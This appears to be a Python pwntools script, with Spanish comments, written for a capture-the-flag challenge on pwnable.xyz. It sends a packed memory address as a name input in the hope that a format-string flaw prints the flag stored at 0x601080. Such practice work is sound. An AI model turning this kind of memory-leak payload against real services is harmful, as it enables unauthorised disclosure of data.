#!/usr/bin/env python3

from pwn import *

# La flag está en 0x601080
flag_addr = 0x601080

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Intentar poner la dirección de flag como string
# Si printf interpreta algo, podría revelarla
payload = p64(flag_addr)

conn.sendline(payload)

data = conn.recvall(timeout=3)
log.info(f"Respuesta: {data}")

# Buscar FLAG en la respuesta
if b'FLAG{' in data:
    log.success(f"¡FLAG encontrada en respuesta!")
    # Extraer la flag
    start = data.find(b'FLAG{')
    end = data.find(b'}', start) + 1
    flag = data[start:end]
    log.success(f"FLAG: {flag.decode()}")

conn.close()